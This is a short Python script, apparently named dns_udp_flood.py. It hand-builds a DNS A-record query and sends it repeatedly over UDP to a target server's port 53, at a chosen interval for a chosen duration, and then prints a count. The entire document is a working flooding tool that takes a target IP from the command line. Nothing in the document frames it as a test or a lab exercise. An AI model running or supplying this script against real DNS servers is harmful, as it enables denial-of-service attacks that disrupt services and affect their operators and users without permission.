import socket
import time
import struct
import random
import sys

DNS_PORT = 53

def build_dns_query(domain):
    tid = random.randint(0, 65535)
    flags = 0x0100  # standard query
    qdcount = 1
    ancount = nscount = arcount = 0

    header = struct.pack(
        "!HHHHHH",
        tid, flags, qdcount, ancount, nscount, arcount
    )

    question = b""
    for part in domain.split("."):
        question += struct.pack("B", len(part)) + part.encode()
    question += b"\x00"  # end of name
    question += struct.pack("!HH", 1, 1)  # QTYPE=A, QCLASS=IN

    return header + question

def send_dns_requests(server_ip, domain, interval, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query = build_dns_query(domain)

    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        sock.sendto(query, (server_ip, DNS_PORT))
        count += 1
        time.sleep(interval)

    sock.close()
    print(f"Sent {count} DNS requests")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 dns_udp_flood.py <server_ip> <domain> <interval_sec> <duration_sec>")
        sys.exit(1)

    server_ip = sys.argv[1]
    domain = sys.argv[2]
    interval = float(sys.argv[3])
    duration = float(sys.argv[4])

    send_dns_requests(server_ip, domain, interval, duration)
